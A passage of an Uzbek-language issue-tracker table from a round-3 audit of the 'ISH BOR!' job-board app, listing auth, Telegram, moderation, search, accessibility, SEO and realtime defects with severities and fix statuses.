| [ISSUE-154](#issue-154) | P1 | FIXED | UNVERIFIED | auth/manual-recovery | Qo'lda tiklash (H qoidasi) yo'q: so'rov modeli, admin tekshiruvi va xavfsiz telefon almashtirish amali mavjud emas |
| [ISSUE-155](#issue-155) | P1 | FIXED | UNVERIFIED | security/audit-log | Xavfsizlik audit jurnali yo'q: L qoidasidagi hodisalar hech qayerga yozilmaydi |
| [ISSUE-156](#issue-156) | P1 | FIXED | UNVERIFIED | docs/deploy | Hujjatlar Telegram botni ixtiyoriy deydi, lekin telefon tasdiqlash va asosiy amallar unga bog'liq; K qoidasi hujjatlanmagan |
| [ISSUE-157](#issue-157) | P1 | FIXED | UNVERIFIED | auth/product-rule-A | Telegram hali ham login kanali: API, bot tasdiq oqimi, login tugmasi va 3 tildagi FAQ matnlari (qoida A) |
| [ISSUE-158](#issue-158) | P1 | PARTIAL | UNVERIFIED | trust/company-verification | Kompaniya tasdig'i bitta boolean: nom, sayt yoki logo o'zgarsa ham 'tasdiqlangan' belgisi qoladi; dalil va so'rov oqimi yo'q |
| [ISSUE-159](#issue-159) | P1 | FIXED | UNVERIFIED | data-integrity/product-rule-E-F | Tasdiqlangan telefon unikal emas va unlink/relink'dan keyin eski hisobda qoladi: bitta raqam bir nechta hisobni tasdiqlaydi |
| [ISSUE-160](#issue-160) | P1 | FIXED | UNVERIFIED | candidate-profile/product-rule-F-G | Asosiy telefonni almashtirish va zaxira telefon oqimi yo'q; additionalPhone tasdiqsiz erkin matn (qoidalar F, G) |
| [ISSUE-161](#issue-161) | P1 | FIXED | UNVERIFIED | auth/manual-recovery | Qo'lda tiklash (qoida H) imkonsiz: faqat Telegramga uzatiladigan aloqa formasi, saqlanadigan so'rov ham, admin amali ham yo'q |
| [ISSUE-162](#issue-162) | P1 | FIXED | UNVERIFIED | security/audit-log | Xavfsizlik audit log'i yo'q: telefon tasdig'i, Telegram bog'lash/uzish va sessiyalarni bekor qilish qayd etilmaydi (qoida L) |
| [ISSUE-163](#issue-163) | P1 | FIXED | UNVERIFIED | moderation/vacancy-lifecycle | Admin 'arxivlash' bilan olib tashlagan vakansiyani ish beruvchi bir bosishda qayta faollashtiradi (moderatsiyani chetlab o'tish) |
| [ISSUE-164](#issue-164) | P1 | FIXED | UNVERIFIED | auth/telegram-login | Telegram hali ham login kanali: /api/auth/telegram/start va /poll parolsiz sessiya beradi |
| [ISSUE-165](#issue-165) | P1 | FIXED | UNVERIFIED | auth/brute-force | Email bo'yicha login lockout: istalgan kishi qurbonni cheksiz bloklab qo'ya oladi (I qoidasi) |
| [ISSUE-166](#issue-166) | P1 | FIXED | UNVERIFIED | auth/privilege-escalation | ensureAdminUser har ishga tushishda ADMIN_EMAIL bilan mavjud istalgan hisobni adminga ko'taradi |
| [ISSUE-167](#issue-167) | P1 | FIXED | UNVERIFIED | auth/session-cookie | Hujjatlashtirilgan deploy'da refresh cookie third-party (vercel.app va up.railway.app): Safari/iOS va Brave uni bloklaydi, sessiya 15 daqiqada tugaydi |
| [ISSUE-168](#issue-168) | P1 | FIXED | UNVERIFIED | config/availability | Telegram mavjud emasligi modellashtirilmagan: telefon to'sig'i botga qattiq bog'liq, token ixtiyoriy, bot holati bir marta o'rnatiladi (K qoidasi) |
| [ISSUE-169](#issue-169) | P1 | FIXED | UNVERIFIED | telegram/phone-verification | Tasdiqlangan telefon yagona emas va qayta bog'lashda saqlanib qoladi: bitta Telegram/SIM cheksiz hisobni tasdiqlaydi |
| [ISSUE-170](#issue-170) | P1 | FIXED | UNVERIFIED | authz/moderation | Admin 'arxivlash' bilan olib tashlangan vakansiyani ish beruvchi darhol qayta faollashtira oladi (moderatsiyani chetlab o'tish) |
| [ISSUE-171](#issue-171) | P1 | FIXED | UNVERIFIED | authz/moderation-trust | Kompaniya nomi, logo yoki sayti o'zgarsa ham admin bergan 'tasdiqlangan' belgisi saqlanib qoladi |
| [ISSUE-172](#issue-172) | P1 | FIXED | UNVERIFIED | telegram/phone-change | Telefon almashtirish jim qayta yozish: qayta autentifikatsiya, xabarnoma, audit va sessiya bekor qilish yo'q |
| [ISSUE-173](#issue-173) | P1 | FIXED | UNVERIFIED | admin/recovery | Qo'lda hisob tiklash so'rovi va admin tomonidan tasdiqlangan telefon reset'i yo'q (H qoidasi) |
| [ISSUE-174](#issue-174) | P1 | PARTIAL | UNVERIFIED | security/audit-log | Security audit log yo'q: rol, blok, sessiya bekor qilish, Telegram bog'lash/uzish, telefon tasdiqi va moderatsiya iz qoldirmaydi (L qoidasi) |
| [ISSUE-175](#issue-175) | P2 | WONT FIX | UNVERIFIED | scale/transport | API katta JSON va XML javoblarini siqishsiz beradi (compression plugin yo'q) |
| [ISSUE-176](#issue-176) | P2 | FIXED | UNVERIFIED | scale/search | O'xshash vakansiyalar (har detail SSR'da) faqat [categoryId] indeksiga tayanadi: kategoriyadagi barcha vakansiyalar xotirada sort qilinadi |
| [ISSUE-177](#issue-177) | P2 | FIXED | UNVERIFIED | telegram/ux-errors | Telegram bot o'chiq holati oldindan ko'rsatilmaydi: botUsername=null UI'da o'qilmaydi, 503 xom o'zbekcha matni bosgandan keyin chiqadi, telefon darvozasi baribir Telegram talab qiladi |
| [ISSUE-178](#issue-178) | P2 | PARTIAL | UNVERIFIED | notifications | Chat xabari Telegram alertlari bildirishnoma sozlamalarini chetlab o'tadi va chat uchun yagona tashqi kanal |
| [ISSUE-179](#issue-179) | P2 | FIXED | UNVERIFIED | notifications/privacy | notify() sozlanmagan Telegram va email kanallarini ham ishlatadi; SMTP yo'q bo'lsa har bildirishnomada email manzili logga yoziladi |
| [ISSUE-180](#issue-180) | P2 | FIXED | UNVERIFIED | frontend/realtime | O'qilganlik belgilari yashirin yoki fon tabdan yuboriladi |
| [ISSUE-181](#issue-181) | P2 | PARTIAL | UNVERIFIED | notifications | 'system' bildirishnoma turi broadcast, moderatsiya natijalari va to'lovlarni qamraydi, foydalanuvchi uni barcha kanallarda o'chira oladi |
| [ISSUE-182](#issue-182) | P2 | FIXED | UNVERIFIED | admin/users | Admin rol o'zgartirish rollararo nomuvofiq ma'lumot qoldiradi |
| [ISSUE-183](#issue-183) | P2 | PARTIAL | UNVERIFIED | admin/block | Hisobni bloklash unga bog'liq ma'lumotlarni ochiq va erishiladigan holda qoldiradi |
| [ISSUE-184](#issue-184) | P2 | WONT FIX | UNVERIFIED | vacancy/data | Seed va eski vakansiyalarda workplaceType yo'q; sxemada category va workplaceType ixtiyoriy; remote+office ziddiyati qabul qilinadi |
| [ISSUE-185](#issue-185) | P2 | PARTIAL | UNVERIFIED | tooling/integrity | Audit tekshiruv skriptlari (data integrity, scale bench, explain) repoda yo'q; DATA_INTEGRITY baseline eskirgan va yangi auth qoidalarini qamramaydi |
| [ISSUE-186](#issue-186) | P2 | PARTIAL | UNVERIFIED | scale/search | Nomzodlar bazasi har profil uchun relation filter $lookup va to'liq rezyume bilan ishlaydi (8000 nomzodda p50 ~2 s) |
| [ISSUE-187](#issue-187) | P2 | PARTIAL | UNVERIFIED | visibility/company | Bloklangan ish beruvchining kompaniyasi sitemap'dan boshqa barcha o'qish yo'llarida ochiq qoladi |
| [ISSUE-188](#issue-188) | P2 | PARTIAL | UNVERIFIED | authz/staff-invite | Staff taklif tokeni uzoq muddatli bearer-sir: adminga xom holda qaytariladi va taklif qilgan admin bloklansa ham ishlaydi |
| [ISSUE-189](#issue-189) | P2 | FIXED | UNVERIFIED | privacy/push | Push obunalari seansga bog'lanmagan: logout, sessiyalarni bekor qilish va bloklashdan keyin ham bildirishnomalar kelaveradi |
| [ISSUE-190](#issue-190) | P2 | FIXED | UNVERIFIED | authz/trust | Tasdiqlangan kompaniya belgisi nom o'zgarganda saqlanib qoladi: brend nomi ostida o'zini boshqa kompaniya qilib ko'rsatish mumkin |
| [ISSUE-191](#issue-191) | P2 | PARTIAL | UNVERIFIED | search/driver-parity | Meilisearch va MongoDB bir xil so'rovga turli natija qaytaradi; drayver saralash, filtr, facet va alertlarga qarab almashadi |
| [ISSUE-192](#issue-192) | P2 | PARTIAL | UNVERIFIED | search/pagination | Meili yo'li taxminiy jami qaytaradi, 1000-natijadan keyingi sahifalar bo'sh keladi, tartibi esa Mongo 'relevance' bilan mos emas |
| [ISSUE-193](#issue-193) | P2 | PARTIAL | UNVERIFIED | search/index-sync | Kompaniya nomi o'zgarganda vakansiyalar Meilisearch'da qayta indekslanmaydi: eski nom bo'yicha restartgacha topiladi |
| [ISSUE-194](#issue-194) | P2 | PARTIAL | UNVERIFIED | search/tokenization | So'rov tokenizatsiyasi modullar orasida umumiy emas: vakansiyada so'zlar jimgina tashlanadi va tinish belgisi so'zda qoladi, nomzod va admin qidiruvi butun satrni bitta substring sifatida qidiradi |
| [ISSUE-195](#issue-195) | P2 | PARTIAL | UNVERIFIED | search/relevance | 4 belgidan qisqa so'zlar sarlavha va kompaniya/kategoriya nomida substring sifatida mos keladi (keraksiz natija), talablarda esa umuman qidirilmaydi (tushib qolgan natija) |
| [ISSUE-196](#issue-196) | P2 | FIXED | UNVERIFIED | a11y/status-messages | Telefon gate eslatmasi ekran o'quvchiga e'lon qilinmaydi: Ariza/Joylash/Xabar bloklansa, hech qanday xabar eshitilmaydi |
| [ISSUE-197](#issue-197) | P2 | FIXED | UNVERIFIED | a11y/forms | Profil/rezyume va kompaniya formalarida majburiy maydonlar belgilanmaydi, validatsiya xatolari va saqlash natijasi e'lon qilinmaydi |
| [ISSUE-198](#issue-198) | P2 | PARTIAL | UNVERIFIED | a11y/focus-management | Remount va unmount'da klaviatura fokusi <body>'ga tushib qoladi: rezyume wizard, inline editorlar va ish beruvchining arizalar sahifasi |
| [ISSUE-199](#issue-199) | P2 | FIXED | UNVERIFIED | telegram/bot | Botdagi oddiy /start ISH BOR! saytiga havola yubormaydi (C qoidasi) |
| [ISSUE-200](#issue-200) | P2 | FIXED | UNVERIFIED | seo/meta | Vakansiya va kompaniya detail sahifalari ro'yxat +Head'ini meros oladi: ikkitadan description, og:title, og:type va canonical chiqadi |
| [ISSUE-201](#issue-201) | P2 | FIXED | UNVERIFIED | seo/og | OG rasm shriftlari faqat lotin: kirillcha vakansiya sarlavhasi va kompaniya nomi glifsiz chiziladi |
| [ISSUE-202](#issue-202) | P2 | WONT FIX | UNVERIFIED | seo/hreflang | Tarjima qilinmagan vakansiya, kompaniya va maqola kontenti ru/en hreflang alternate sifatida e'lon qilinadi; Article inLanguage URL tilidan olinadi |
| [ISSUE-203](#issue-203) | P2 | WONT FIX | UNVERIFIED | i18n/telegram | Telegram bot va 'tasdiqlash vaqtincha mavjud emas' xabarlari faqat o'zbekcha; bot foydalanuvchi tilini bilmaydi |
| [ISSUE-204](#issue-204) | P2 | FIXED | UNVERIFIED | a11y/forms | Login va signup xatolari screen reader'ga e'lon qilinmaydi va maydonlarga bog'lanmagan |
| [ISSUE-205](#issue-205) | P2 | FIXED | UNVERIFIED | responsive | Header overlay'lari telefon viewport'iga sig'maydi: mobil menyuda max-height yo'q, qo'ng'iroq popover'i chap tomondan kesiladi |
| [ISSUE-206](#issue-206) | P2 | PARTIAL | UNVERIFIED | reliability/product-rule-K | Telegram bot ishlamasa yoki token berilmagan bo'lsa ariza yuborish yo'li berk; UI 'tasdiqlash vaqtincha mavjud emas' demaydi (qoida K) |
| [ISSUE-207](#issue-207) | P2 | FIXED | UNVERIFIED | telegram-bot/product-rule-C | Botdagi oddiy /start ISH BOR! saytiga havola yubormaydi (qoida C) |
| [ISSUE-208](#issue-208) | P2 | FIXED | UNVERIFIED | admin/data-integrity | Admin ish beruvchi rolini o'zgartirsa vakansiyalari faol qoladi va arizalar egasiz qoladi |
| [ISSUE-209](#issue-209) | P2 | PARTIAL | UNVERIFIED | moderation/vacancy-lifecycle | Vakansiya rad etilishi majburiy emas: o'chirib qayta joylash darhol faol, rad etilgandan keyin tasdiqlangan e'lon erkin tahrirlanadi |
| [ISSUE-210](#issue-210) | P2 | PARTIAL | UNVERIFIED | scale/candidates-db | Nomzodlar qidiruvi barcha profillar bo'yicha relation filter ($lookup) va offset sahifalashdan foydalanadi |
| [ISSUE-211](#issue-211) | P2 | PARTIAL | UNVERIFIED | telegram/payload-storage | Deep-link va auth challenge tokenlari jarayon xotirasida: cheksiz Map, har chaqiruvda O(n) tozalash, xom saqlanadi, restartda yo'qoladi |
| [ISSUE-212](#issue-212) | P2 | FIXED | UNVERIFIED | telegram/identity | Hisob identifikatori chat.id bo'yicha, chat turi tekshirilmaydi: guruh chatlari bog'lanishi va telefonni tasdiqlashi mumkin |
| [ISSUE-213](#issue-213) | P2 | PARTIAL | UNVERIFIED | telegram/support-relay | Support relay: #u marshrut tegi foydalanuvchi matnidan olinadi (first_name orqali soxtalashtiriladi), chat bo'yicha limit yo'q, xato muvaffaqiyat deb ko'rsatiladi |
| [ISSUE-214](#issue-214) | P2 | WONT FIX | UNVERIFIED | admin-staff/support | Telegram admin-chat support relay panel RBAC bilan emas, chat a'zoligi bilan boshqariladi va saqlanmaydi |
| [ISSUE-215](#issue-215) | P2 | PARTIAL | UNVERIFIED | telegram/privacy | UI'da Telegramni uzish yo'q; shaxsiy chat xabarlari preview'si sozlamalarga qaramay Telegramga yuboriladi |
| [ISSUE-216](#issue-216) | P2 | PARTIAL | UNVERIFIED | telegram/bot-ux | Botda oddiy /start sayt havolasini bermaydi; /myid konfiguratsiya maslahatini ochadi; bot matnlari faqat o'zbekcha |
| [ISSUE-217](#issue-217) | P2 | PARTIAL | UNVERIFIED | authz/admin-roles | Rol o'zgarishida himoya yo'q: istalgan admin admin bera oladi yoki boshqa barcha adminlarni bloklaydi; qayta autentifikatsiya va oxirgi admin guard'i yo'q |
| [ISSUE-218](#issue-218) | P2 | PARTIAL | UNVERIFIED | admin-staff/users | Admin rol o'zgarishi nomuvofiq holat qoldiradi: ish beruvchidan olingan rolda faol vakansiyalar qoladi, staff rollari users sahifasida modellashtirilmagan |
| [ISSUE-219](#issue-219) | P2 | FIXED | UNVERIFIED | functional/uploads | Yuklangan PDF rezyume web UI'da employer'ga hech qachon yetib bormaydi; uning doimiy havolasini faqat ishlatilmaydigan endpoint qaytaradi |
| [ISSUE-220](#issue-220) | P2 | FIXED | UNVERIFIED | security/uploads | Multipart parser fayldan oldingi cheksiz fayl bo'lmagan maydonlarni xotirada saqlaydi (login qilgan foydalanuvchi uchun memory DoS) |
| [ISSUE-221](#issue-221) | P2 | FIXED | UNVERIFIED | cors/performance | CORS preflight keshlanmaydi: har autentifikatsiyalangan brauzer so'rovi qo'shimcha OPTIONS aylanishini to'laydi |
| [ISSUE-222](#issue-222) | P2 | FIXED | UNVERIFIED | headers/coop | Web'da COOP same-origin Google Sign-In popup callback'ini buzishi mumkin |
| [ISSUE-223](#issue-223) | P2 | FIXED | UNVERIFIED | rate-limit/ssr | Global per-IP rate limit SSR'ni ham cheklaydi: SSR API'ga umumiy Vercel egress IP'laridan keladi |
| [ISSUE-224](#issue-224) | P2 | PARTIAL | UNVERIFIED | telegram/backup-phone | Zaxira telefon (F qoidasi) tasdiqlanmagan, yagona emas, erkin matn |
| [ISSUE-225](#issue-225) | P2 | WONT FIX | UNVERIFIED | admin-staff/broadcast | Ommaviy xabar jarayon xotirasida fire-and-forget: bardoshli yozuv, progress va davom ettirish yo'q |
| [ISSUE-226](#issue-226) | P2 | FIXED | UNVERIFIED | admin-staff/performance | Admin ro'yxat qidiruvi relation filtr va langarsiz regex ishlatadi, har so'rovda ikki marta bajariladi |
| [ISSUE-227](#issue-227) | P2 | PARTIAL | UNVERIFIED | admin-staff/recovery | Xodim va bootstrap admin hisoblarida telefon yo'q: Telegram orqali tiklash ular uchun hech qachon ishlamaydi |
| [ISSUE-228](#issue-228) | P3 | PARTIAL | UNVERIFIED | scale/admin | Admin qidiruvi relation filter bilan butun kolleksiya ustida; vakansiya createdAt sort'i indekssiz; chuqur skip; overview qatorlarni Node'ga yuklaydi |
| [ISSUE-229](#issue-229) | P3 | FIXED | UNVERIFIED | realtime/performance | Reconnect backoff'da jitter yo'q: deploy'dan keyin barcha klientlar bir paytda qayta ulanib to'liq qayta yuklaydi |
| [ISSUE-230](#issue-230) | P3 | PARTIAL | UNVERIFIED | realtime/chat | Yo'qolgan ack + 'Qayta yuborish' dublikat xabar yaratadi: server clientId bo'yicha idempotent emas |
| [ISSUE-231](#issue-231) | P3 | FIXED | UNVERIFIED | realtime/chat | WS frame'lari parallel qayta ishlanadi: tez ketma-ket xabarlar noto'g'ri tartibda saqlanishi mumkin |
| [ISSUE-232](#issue-232) | P3 | FIXED | UNVERIFIED | realtime/auth | Socket sessiya tekshiruvi tugashidan oldin ro'yxatga olinadi va jonli payload oladi |
| [ISSUE-233](#issue-233) | P3 | FIXED | UNVERIFIED | realtime/UX | Server token muddati tugaganda har socketni yopadi: har 15 daqiqada to'liq reconnect va reload |
| [ISSUE-234](#issue-234) | P3 | PARTIAL | UNVERIFIED | frontend/realtime | Klientda liveness tekshiruvi yo'q: yarim ochiq socket ulangan bo'lib ko'rinadi |
| [ISSUE-235](#issue-235) | P3 | FIXED | UNVERIFIED | infra/realtime | Jarayon ichidagi socket registri bitta replica cheklovi sabablari qatorida hujjatlanmagan |
| [ISSUE-236](#issue-236) | P3 | FIXED | UNVERIFIED | frontend/push | Service worker push bosilganda nazorat qilinmagan oynada navigate() chaqiradi |
| [ISSUE-237](#issue-237) | P3 | FIXED | UNVERIFIED | frontend/notifications | Header qo'ng'irog'idagi mark-read, mark-all-read va delete optimistik yangilashdan keyin API xatosini yutadi |
| [ISSUE-238](#issue-238) | P3 | PARTIAL | UNVERIFIED | frontend/errors | Mutation fetcherlari tarmoq va JSON bo'lmagan xatolarni normallashtirmaydi: formalar brauzerning xom matnini yoki har tilda o'zbekcha fallback'ni ko'rsatadi |
| [ISSUE-239](#issue-239) | P3 | PARTIAL | UNVERIFIED | realtime/error-semantics | Chat WebSocket rad etilgan yoki muvaffaqiyatsiz yuborishlarni jimgina tashlaydi (xato frame'i yo'q); klient 10 s dan keyin umumiy 'yuborilmadi' ko'rsatadi |
| [ISSUE-240](#issue-240) | P3 | FIXED | UNVERIFIED | api/error-contract | Global error handler: Fastify default 404 tanasi, infratuzilma xatolari 500 ga aylanadi, ichki FST_* kodlari va inglizcha matn 4xx sifatida o'tadi |
| [ISSUE-241](#issue-241) | P3 | FIXED | UNVERIFIED | api/error-semantics | POST /api/push/unsubscribe DB o'chirish xato bersa ham muvaffaqiyat qaytaradi |
| [ISSUE-242](#issue-242) | P3 | FIXED | UNVERIFIED | telegram/error-semantics | Telegram bot /start, kontakt yoki callback handler xato bersa foydalanuvchiga javob yubormaydi |
| [ISSUE-243](#issue-243) | P3 | FIXED | UNVERIFIED | security/push | POST /api/push/subscribe istalgan https host'ni qabul qiladi: server hujumchi tanlagan host:port'ga so'rov yuboradi |
| [ISSUE-244](#issue-244) | P3 | FIXED | UNVERIFIED | privacy/logging | SMTP sozlanmagan bo'lsa, har bir bildirishnoma qabul qiluvchining email manzilini stdout'ga yozadi |
| [ISSUE-245](#issue-245) | P3 | PARTIAL | UNVERIFIED | privacy/enumeration | Ro'yxatdan o'tish mehmonga email bilan hisob mavjudligini oshkor qiladi |
| [ISSUE-246](#issue-246) | P3 | PARTIAL | UNVERIFIED | docs/stale | DESIGN.md, tizim-arxitekturasi.md 19-bo'limi va audit xaritalari joriy kodga zid holatni hozirgi holat sifatida ko'rsatadi |
| [ISSUE-247](#issue-247) | P3 | FIXED | UNVERIFIED | docs/changelog-readme | CHANGELOG 0.3.0'da to'xtab qolgan, README'dagi buyruq va sahifa ro'yxatlari eskirgan: sentyabrdagi deploy'ni buzadigan o'zgarishlar qayd etilmagan |
| [ISSUE-248](#issue-248) | P3 | FIXED | UNVERIFIED | seo/og | og:image API host'idagi /api/og/... ga qaraydi, API'ning o'z robots.txt'i esa /api'ni Disallow qiladi |
| [ISSUE-249](#issue-249) | P3 | FIXED | UNVERIFIED | seo/og-performance | OG rasm endpointi har so'rovda satori+resvg bilan qayta chizadi, server kesh yo'q |
| [ISSUE-250](#issue-250) | P3 | FIXED | UNVERIFIED | i18n/plurals | RU/EN son matnlarida ko'plik shakli hisobga olinmaydi ('1 кандидатов', '1 откликов', '1 candidates') |
| [ISSUE-251](#issue-251) | P3 | PARTIAL | UNVERIFIED | i18n/og | Vakansiya OG ulashish rasmi /ru va /en sahifalar uchun ham har doim o'zbekcha chiziladi |
| [ISSUE-252](#issue-252) | P3 | PARTIAL | UNVERIFIED | ux/phone-gate | Telefon gate'i faqat Ariza bosilgandan keyin ma'lum bo'ladi; gate havolasi profil umumiy sahifasiga olib boradi va vakansiya yo'qoladi |
| [ISSUE-253](#issue-253) | P3 | FIXED | UNVERIFIED | scale/notifications | Bildirishnomalar markazida faqat oxirgi 100 ta bildirishnomaga yetib boriladi |
| [ISSUE-254](#issue-254) | P3 | PARTIAL | UNVERIFIED | ux/auth-polish | Login'dagi 'Meni eslab qol' belgisi hech narsa qilmaydi; Apple tugmasi ishlamaydigan placeholder |
| [ISSUE-255](#issue-255) | P3 | FIXED | UNVERIFIED | scale/admin-moderation | Admin vakansiya moderatsiyasi qidiruvi kompaniya relation filter'i va har qatorda _count ishlatadi |
| [ISSUE-256](#issue-256) | P3 | FIXED | UNVERIFIED | data-integrity/applications | Ariza 'source' maydoni klient tomonidan boshqariladi, 'Telegram orqali' belgisini soxtalashtirish mumkin |
| [ISSUE-257](#issue-257) | P3 | PARTIAL | UNVERIFIED | auth/enumeration | Ro'yxatdan o'tish email mavjudligini oshkor qiladi (argon2'dan oldin 409) |
| [ISSUE-258](#issue-258) | P3 | PARTIAL | UNVERIFIED | authz/chat-abuse | Ish izlovchi har qanday kompaniya bilan suhbat ocha oladi va kompaniya egasining user ID'sini bilib oladi |
| [ISSUE-259](#issue-259) | P3 | PARTIAL | UNVERIFIED | uploads/data-hygiene | Yetim yuklangan fayllar hech qachon tozalanmaydi va ochiq qoladi (poyga, DB xatosi, saqlanmagan muqovalar, .part fayllar) |
| [ISSUE-260](#issue-260) | P3 | WONT FIX | UNVERIFIED | privacy/uploads | Rasmlar baytma-bayt saqlanadi: EXIF/GPS metama'lumoti ochiq, piksel o'lchami cheklanmagan |
| [ISSUE-261](#issue-261) | P3 | FIXED | UNVERIFIED | security/xss-email | Email HTML escaper qo'shtirnoqni escape qilmaydi, lekin href atributi ichida ishlatiladi |
| [ISSUE-262](#issue-262) | P3 | FIXED | UNVERIFIED | dev-infra | docker-compose autentifikatsiyasiz MongoDB va kalitsiz Meilisearch'ni barcha host interfeyslarida ochadi |
| [ISSUE-263](#issue-263) | P3 | PARTIAL | UNVERIFIED | admin-staff/ux | Ta'sirli admin amallarida tasdiq yo'q yoki umumiy tasdiq |
| [ISSUE-264](#issue-264) | P3 | FIXED | UNVERIFIED | admin-staff/maintenance | Qidiruv reindex'i qulfsiz HTTP so'rov ichida ishlaydi: parallel reindex yoki e'lon yangi hujjatlarni o'chirib yuborishi mumkin |
| [ISSUE-265](#issue-265) | P3 | PARTIAL | UNVERIFIED | admin-staff/docs | Hujjat va izohlar hali ham admin route'lari tokendagi rol bilan requireRole ishlatadi deydi |

### Qayta topilgan mavjud muammolar

| Mavjud ID | Sev | Verification | Joriy holat (Round 3 kodi) | Round 3 holati |
|---|---|---|---|---|
| ISSUE-012 | P1 | UNVERIFIED | Yangi auth qoidalari uchun persistent ma'lumot modeli yo'q: tiklash tokenlari, backup telefon, qo'lda tiklash, security audit log | FIXED |
| ISSUE-042 | P1 | UNVERIFIED | Google login bir xil emailli tasdiqlanmagan mavjud hisobga egalik isbotisiz birlashadi (pre-account takeover) | FIXED |
| ISSUE-042 | P1 | UNVERIFIED | Google login mavjud email hisobiga avtomatik kiritadi (pre-account takeover); D-011 buni saqlab qolgan | FIXED |
| ISSUE-027 | P1 | UNVERIFIED | Sharh moderatsiyasini chetlab o'tish: muallif rad etilgan sharhni o'chirib qayta yuborsa, u darhol 'approved' bo'ladi | FIXED |
| ISSUE-012 | P1 | UNVERIFIED | Telegram orqali parolni tiklash oqimi yo'q; FAQ Telegram-login'ni tavsiya qiladi, tracker esa email-reset'ni rejalashtirgan | PARTIAL |
| ISSUE-026 | P1 | UNVERIFIED | Server import qiladigan modullar va butun docs/ git'da untracked: DEPLOY.md'dagi GitHub'dan deploy buzilgan HEAD'ni quradi | PARTIAL |
| ISSUE-012 | P1 | UNVERIFIED | Telegram orqali parolni tiklash va parolni o'zgartirish yo'q; 'Parolni unutdingizmi?' /support'ga olib boradi (qoidalar B, I, J) | FIXED |
| ISSUE-010 | P1 | UNVERIFIED | Telegram bog'lash deep-link'i tasdiqsiz ishlaydi: hujumchi jabrlanuvchining telefonini o'z hisobiga tasdiqlatadi | FIXED |
| ISSUE-042 | P1 | UNVERIFIED | Google login tasdiqlanmagan email bilan ochilgan mavjud hisobga avtomatik birlashadi (pre-account takeover) | FIXED |
| ISSUE-011 | P1 | UNVERIFIED | TRUST_PROXY sukut bo'yicha true: soxta X-Forwarded-For barcha IP rate-limitlarini chetlab o'tadi | FIXED |
| ISSUE-042 | P1 | UNVERIFIED | Google login bir xil emailli mavjud hisobga (tasdiqlanmagan parolli va admin hisoblariga ham) avtomatik kiritadi | FIXED |
| ISSUE-010 | P1 | UNVERIFIED | Telegram bog'lash deep-link tasdiqsiz: chat boshqa hisobdan jimgina uziladi, hujumchi hisobiga qurbon telefoni tasdiqlanadi | FIXED |
| ISSUE-008 | P1 | UNVERIFIED | Tasdiqlanmagan istalgan employer hisobi barcha ochiq nomzodlarning ismi va to'liq rezyumesini ommaviy yig'a oladi; ko'rinish sukut bo'yicha yoqilgan | FIXED |
| ISSUE-012 | P1 | UNVERIFIED | Telegram orqali parolni tiklash va parolni o'zgartirish oqimi umuman yo'q (B, I, J qoidalari) | FIXED |
| ISSUE-048 | P2 | UNVERIFIED | Filtrli va matnli facets keshsiz: har filtr o'zgarishida 7 ta agregatsiya, ulardan biri barcha faol vakansiyalar ustida | PARTIAL |
| ISSUE-125 | P2 | UNVERIFIED | Yagona global kesh versiyasi: har vakansiya, kompaniya yoki sharh yozuvi katalog, facets, maosh va home keshlarini birdan bekor qiladi | PARTIAL |
| ISSUE-046 | P2 | UNVERIFIED | Chat: suhbatlar ro'yxati va xabar tarixi cursor sahifalashsiz, reconnect'da to'liq qayta yuklanadi | PARTIAL |
| ISSUE-046 | P2 | UNVERIFIED | Header hisoblagichlari har tabda (yashirin ham) 20 s va 45 s da poll qiladi, WS allaqachon push qilsa ham; employer summary har safar barcha vakansiya ID'larini o'qiydi | PARTIAL |
| ISSUE-058 | P2 | UNVERIFIED | Ish beruvchi vakansiyalari 1000 tagacha to'liq hujjat qaytaradi (500 da 987 KB); tahrirlash formasi bitta yozuv uchun butun ro'yxatni yuklaydi | FIXED |
| ISSUE-049 | P2 | UNVERIFIED | Kompaniyalar katalogi har cold so'rov, har cursor sahifa va har kompaniya sahifasida (/similar keshsiz) $lookup pipeline bajaradi | PARTIAL |
| ISSUE-070 | P2 | UNVERIFIED | SSR'da API ishlamasa HTTP 200 qaytadi: detail sahifalar noindex oladi (indeksdan chiqish), ro'yxat sahifalari soft-404 | FIXED |
| ISSUE-069 | P2 | UNVERIFIED | ISSUE-069 hali qisman: maosh statistikasi, maqolalar va contact SSR fetcherlarida timeout yo'q | FIXED |
| ISSUE-035 | P2 | UNVERIFIED | Sessiyani bekor qilish ochiq WebSocket'larni yopmaydi; har chaqiruvchi closeUserSockets'ni qo'lda eslashi kerak | FIXED |
| ISSUE-040 | P2 | UNVERIFIED | WS rate limit har ulanish uchun, foydalanuvchiga socket chegarasi yo'q; oflayn qabul qiluvchiga har xabar alohida Telegram alert | FIXED |
| ISSUE-073 | P2 | UNVERIFIED | Backend bildirishnoma matnlari o'zbekcha satr sifatida saqlanadi, havolalar til prefiksini yo'qotadi | PARTIAL |
| ISSUE-025 | P2 | UNVERIFIED | Admin vakansiyani qattiq o'chirsa arizalar, tarix va saqlanganlar cascade bilan yo'qoladi | FIXED |
| ISSUE-036 | P2 | UNVERIFIED | Ariza holati istalgan o'tishni qabul qiladi, ariza yuborishda boshlang'ich tarix qatori yozilmaydi | PARTIAL |
| ISSUE-045 | P2 | UNVERIFIED | Ish beruvchi arizalari ro'yxati server sahifalashsiz: 2000 cheklov eskilarini yashiradi, har qatorda to'liq rezyume (3.5 s / 2.6 MB) | FIXED |
| ISSUE-048 | P2 | UNVERIFIED | Vakansiya ro'yxati: saralash oxiridagi id indeksda yo'q (blocking sort), har so'rovda count va regex matn qidiruvi | PARTIAL |
| ISSUE-029 | P2 | UNVERIFIED | Nomzod rezyume PDF'lari ochiq bearer URL; resumeUrl web ishlatmaydigan endpoint orqali vakansiya egalariga ham yuboriladi | FIXED |
| ISSUE-078, ISSUE-083 | P2 | UNVERIFIED | Web origin'da CSP yo'q va access token localStorage'da: istalgan XSS tokenni o'g'irlay oladi | FIXED |
| ISSUE-011 | P2 | UNVERIFIED | Email bo'yicha global login bloki (D-007) I qoidasiga zid; TRUST_PROXY sukuti 'true' bo'lgani uchun IP limitini hali ham soxtalashtirish mumkin | FIXED |
| ISSUE-076, ISSUE-077 | P2 | UNVERIFIED | DESIGN.md kontrast tekshirilgan deydi, audit esa AA buzilishlarini o'lchagan; prefers-reduced-motion ataylab e'tiborsiz qoldirilgan | FIXED |
| ISSUE-122 | P2 | UNVERIFIED | Auth va Telegram oqimlari uchun test strategiyasi yo'q; bot handler'larini unit-test qilib bo'lmaydi | PARTIAL |
| ISSUE-070 | P2 | UNVERIFIED | SSR +data API xatosini HTTP 200 ga aylantiradi: detail sahifalar noindex, ro'yxat va bosh sahifa indekslanadigan xato holati (503 yo'q) | FIXED |
